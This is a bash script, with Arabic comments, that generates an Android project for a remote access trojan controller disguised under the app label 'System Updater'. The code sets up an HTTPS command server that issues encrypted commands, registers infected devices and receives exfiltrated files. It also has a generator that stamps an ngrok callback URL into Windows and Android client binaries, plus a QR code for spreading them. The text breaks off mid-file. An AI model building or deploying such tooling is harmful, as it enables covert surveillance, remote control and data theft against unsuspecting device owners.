#!/bin/bash

# إنشاء هيكل المجلدات
mkdir -p ~/RemoteGuardian/app/app/src/main/java/com/remote/guardian
mkdir -p ~/RemoteGuardian/app/app/src/main/res/layout
mkdir -p ~/RemoteGuardian/app/app/src/main/res/values
mkdir -p ~/RemoteGuardian/app/assets

cd ~/RemoteGuardian/app

# إنشاء ملف build.gradle
cat > build.gradle << 'EOF'
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    compileSdk 34
    defaultConfig {
        applicationId "com.remote.guardian"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'org.nanohttpd:nanohttpd:2.3.1'
    implementation 'com.google.zxing:core:3.5.3'
    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
    implementation 'commons-io:commons-io:2.15.1'
}
EOF

# إنشاء ملف AndroidManifest.xml
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.remote.guardian">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="System Updater"
        android:theme="@style/Theme.RemoteGuardian">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity
            android:name=".QrActivity"
            android:theme="@style/Theme.Transparent" />
    </application>
</manifest>
EOF

# إنشاء ملف strings.xml
cat > app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">System Updater</string>
</resources>
EOF

# إنشاء ملف themes.xml
cat > app/src/main/res/values/themes.xml << 'EOF'
<resources>
    <style name="Theme.RemoteGuardian" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
        <item name="android:windowBackground">@color/white</item>
    </style>
    <style name="Theme.Transparent" parent="Theme.MaterialComponents.DayNight.NoActionBar">
        <item name="android:windowIsTranslucent">true</item>
        <item name="android:windowBackground">@android:color/transparent</item>
    </style>
</resources>
EOF

# إنشاء ملف activity_main.xml
cat > app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Public URL (ngrok)"
        android:textSize="16sp"
        android:textStyle="bold"/>

    <EditText
        android:id="@+id/etPublicUrl"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="https://abc123.ngrok.io"
        android:inputType="textUri"/>

    <TextView
        android:id="@+id/tvLocalUrl"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="8dp"
        android:text="Local URL: "/>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:orientation="horizontal">

        <Button
            android:id="@+id/btnGenerateWindows"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Generate Windows"
            android:layout_marginEnd="4dp"/>

        <Button
            android:id="@+id/btnGenerateAndroid"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Generate Android"
            android:layout_marginStart="4dp"/>
    </LinearLayout>

    <Button
        android:id="@+id/btnShowQr"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Show QR Code"/>

    <EditText
        android:id="@+id/etCommand"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:hint="Enter command (e.g., screen, upload file.txt)"
        android:inputType="text"/>

    <Button
        android:id="@+id/btnSetCommand"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Set Command"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:text="Connected Clients:"
        android:textSize="16sp"
        android:textStyle="bold"/>

    <Button
        android:id="@+id/btnRefreshClients"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Refresh Clients"/>

    <androidx.recyclerview.widget.RecyclerView
        android:id="@+id/rvClients"
        android:layout_width="match_parent"
        android:layout_height="200dp"
        android:layout_marginTop="8dp"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:text="Uploaded Files:"
        android:textSize="16sp"
        android:textStyle="bold"/>

    <Button
        android:id="@+id/btnRefreshFiles"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Refresh Files"/>

    <androidx.recyclerview.widget.RecyclerView
        android:id="@+id/rvFiles"
        android:layout_width="match_parent"
        android:layout_height="150dp"
        android:layout_marginTop="8dp"/>

</LinearLayout>
EOF

# إنشاء ملف activity_qr.xml
cat > app/src/main/res/layout/activity_qr.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical">
    <ImageView
        android:id="@+id/ivQr"
        android:layout_width="500dp"
        android:layout_height="500dp" />
</LinearLayout>
EOF

# ملفات Kotlin
cat > app/src/main/java/com/remote/guardian/MainActivity.kt << 'EOF'
package com.remote.guardian

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import com.remote.guardian.databinding.ActivityMainBinding
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var webServer: WebServer
    private val clientsAdapter = ClientAdapter()
    private val filesAdapter = FilesAdapter()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        checkPermissions()
        startServer()
        setupUI()
    }

    private fun checkPermissions() {
        val permissions = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        ).filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 100)
        }
    }

    private fun startServer() {
        webServer = WebServer(this, 443)
        webServer.start()
        val ip = getLocalIpAddress()
        binding.tvLocalUrl.text = "Local URL: https://$ip:443"
    }

    private fun getLocalIpAddress(): String? {
        val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        val ip = wifiManager.connectionInfo.ipAddress
        return String.format("%d.%d.%d.%d",
            ip and 0xff,
            (ip shr 8) and 0xff,
            (ip shr 16) and 0xff,
            (ip shr 24) and 0xff
        )
    }

    private fun setupUI() {
        binding.rvClients.layoutManager = LinearLayoutManager(this)
        binding.rvClients.adapter = clientsAdapter

        binding.rvFiles.layoutManager = LinearLayoutManager(this)
        binding.rvFiles.adapter = filesAdapter

        binding.btnRefreshClients.setOnClickListener {
            refreshClients()
        }

        binding.btnRefreshFiles.setOnClickListener {
            refreshFiles()
        }

        binding.btnSetCommand.setOnClickListener {
            val cmd = binding.etCommand.text.toString()
            webServer.setCommand(cmd)
            Toast.makeText(this, "Command set: $cmd", Toast.LENGTH_SHORT).show()
        }

        binding.btnGenerateWindows.setOnClickListener {
            val publicUrl = binding.etPublicUrl.text.toString()
            if (publicUrl.isEmpty()) {
                Toast.makeText(this, "Please enter public URL (from ngrok)", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            val file = ClientGenerator.generateWindowsClient(this, publicUrl)
            Toast.makeText(this, "Generated: ${file.absolutePath}", Toast.LENGTH_LONG).show()
        }

        binding.btnGenerateAndroid.setOnClickListener {
            val publicUrl = binding.etPublicUrl.text.toString()
            if (publicUrl.isEmpty()) {
                Toast.makeText(this, "Please enter public URL (from ngrok)", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            val file = ClientGenerator.generateAndroidClient(this, publicUrl)
            Toast.makeText(this, "Generated: ${file.absolutePath}", Toast.LENGTH_LONG).show()
        }

        binding.btnShowQr.setOnClickListener {
            val url = binding.etPublicUrl.text.toString()
            if (url.isNotEmpty()) {
                startActivity(Intent(this, QrActivity::class.java).putExtra("url", url))
            } else {
                Toast.makeText(this, "Enter public URL first", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun refreshClients() {
        val clients = webServer.getClients()
        clientsAdapter.update(clients)
    }

    private fun refreshFiles() {
        val files = webServer.getFiles()
        filesAdapter.update(files)
    }
}
EOF

cat > app/src/main/java/com/remote/guardian/WebServer.kt << 'EOF'
package com.remote.guardian

import android.content.Context
import fi.iki.elonen.NanoHTTPD
import java.io.File
import java.security.KeyStore
import javax.net.ssl.KeyManagerFactory
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManagerFactory
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class WebServer(context: Context, port: Int) : NanoHTTPD(port) {
    private val clients = mutableMapOf<String, ClientInfo>()
    private var currentCommand = "idle"
    private val filesDir = context.filesDir
    private val aesKey = "0123456789abcdef".toByteArray()

    data class ClientInfo(val firstSeen: Long, var lastSeen: Long, var deviceInfo: String = "")

    init {
        if (port == 443) {
            try {
                val ks = KeyStore.getInstance("BKS").apply {
                    context.assets.open("keystore.bks").use { load(it, "password".toCharArray()) }
                }
                val kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm())
                kmf.init(ks, "password".toCharArray())
                val tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm())
                tmf.init(ks)
                val sslContext = SSLContext.getInstance("TLS")
                sslContext.init(kmf.keyManagers, tmf.trustManagers, null)
                makeSecure(sslContext.serverSocketFactory, null)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override fun serve(session: IHTTPSession): Response {
        val uri = session.uri
        return when {
            uri == "/command" -> {
                val encrypted = encrypt(currentCommand)
                newFixedLengthResponse(encrypted)
            }
            uri == "/register" -> {
                val encryptedData = session.inputStream.readBytes()
                val data = decrypt(encryptedData).split("|")
                val clientId = data.getOrElse(0) { "unknown" }
                val info = data.getOrElse(1) { "" }
                val now = System.currentTimeMillis()
                val client = clients.getOrPut(clientId) { ClientInfo(now, now) }
                client.lastSeen = now
                client.deviceInfo = info
                newFixedLengthResponse("ok")
            }
            uri.startsWith("/upload") -> {
                val encryptedFile = session.inputStream.readBytes()
                val decrypted = decrypt(encryptedFile)
                val fileName = session.parameters["name"]?.firstOrNull() ?: "file.bin"
                val outFile = File(filesDir, "${System.currentTimeMillis()}_$fileName")
                outFile.writeBytes(decrypted)
                newFixedLengthResponse("uploaded")
            }
            uri == "/clients" -> {
                val list = clients.map { (id, info) -> "$id|${info.deviceInfo}|${info.lastSeen}" }.joinToString("\n")
                newFixedLengthResponse(list)
            }
            else -> newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "not found")
        }
    }

    fun setCommand(cmd: String) {
        currentCommand = cmd
    }

    fun getClients(): List<Pair<String, ClientInfo>> = clients.map { it.key to it.value }

    fun getFiles(): List<File> = filesDir.listFiles()?.filter { it.isFile } ?: emptyList()

    private fun encrypt(data: String): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(aesKey, "AES"))
        return cipher.doFinal(data.toByteArray())
    }

    private fun decrypt(data: ByteArray): String {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(aesKey, "AES"))
        return String(cipher.doFinal(data))
    }
}
EOF

cat > app/src/main/java/com/remote/guardian/ClientGenerator.kt << 'EOF'
package com.remote.guardian

import android.content.Context
import org.apache.commons.io.IOUtils
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

object ClientGenerator {
    fun generateWindowsClient(context: Context, serverUrl: String): File {
        val template = context.assets.open("windows_client_template.exe").readBytes()
        val clientId = UUID.randomUUID().toString()
        val aesKey = generateRandomKey()

        val config = "$serverUrl|$clientId|${aesKey.joinToString(",")}".toByteArray()
        val encryptedConfig = encryptConfig(config, aesKey)

        val modified = template.copyOf(template.size + encryptedConfig.size)
        System.arraycopy(encryptedConfig, 0, modified, template.size, encryptedConfig.size)

        val outFile = File(context.getExternalFilesDir(null), "client_${clientId.substring(0,8)}.exe")
        outFile.writeBytes(modified)
        return outFile
    }

    fun generateAndroidClient(context: Context, serverUrl: String): File {
        val template = context.assets.open("android_client_template.apk").readBytes()
        val clientId = UUID.randomUUID().toString()
        val aesKey = generateRandomKey()

        val config = "$serverUrl|$clientId|${aesKey.joinToString(",")}".toByteArray()
        val encryptedConfig = encryptConfig(config, aesKey)

        val modified = template.copyOf(template.size + encryptedConfig.size)
        System.arraycopy(encryptedConfig, 0, modified, template.size, encryptedConfig.size)

        val outFile = File(context.getExternalFilesDir(null), "client_${clientId.substring(0,8)}.apk")
        outFile.writeBytes(modified)
        return outFile
    }

    private fun generateRandomKey(): ByteArray {
        val key = ByteArray(16)
        java.security.SecureRandom().nextBytes(key)
        return key
    }

    private fun encryptConfig(data: ByteArray, key: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"))
        return cipher.doFinal(data)
    }
}
EOF

cat > app/src/main/java/com/remote/guardian/ClientAdapter.kt << 'EOF'
package com.remote.guardian

import android.view.ViewGroup
import android.widget.TextView
import androidx.recyclerview.widget.RecyclerView
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ClientAdapter : RecyclerView.Adapter<ClientAdapter.ViewHolder>() {
    private var clients = listOf<Pair<String, WebServer.ClientInfo>>()

    class ViewHolder(val textView: TextView) : RecyclerView.ViewHolder(textView)

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
        val tv = TextView(parent.context)
        tv.setPadding(16, 16, 16, 16)
        return ViewHolder(tv)
    }

    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
        val (id, info) = clients[position]
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val lastSeen = dateFormat.format(Date(info.lastSeen))
        holder.textView.text = "ID: $id\nDevice: ${info.deviceInfo}\nLast seen: $lastSeen"
    }

    override fun getItemCount() = clients.size

    fun update(newClients: List<Pair<String, WebServer.ClientInfo>>) {
        clients = newClients
        notifyDataSetChanged()
    }
}
EOF

cat > app/src/main/java/com/remote/guardian/FilesAdapter.kt << 'EOF'
package com.remote.guardian

import android.view.ViewGroup
import android.widget.TextView
import androidx.recyclerview.widget.RecyclerView
import java.io.File

class FilesAdapter : RecyclerView.Adapter<FilesAdapter.ViewHolder>() {
    private var files = listOf<File>()

    class ViewHolder(val textView: TextView) : RecyclerView.ViewHolder(textView)

    override fun onCreateViewHolder(parent: ViewGroup, viewType: In
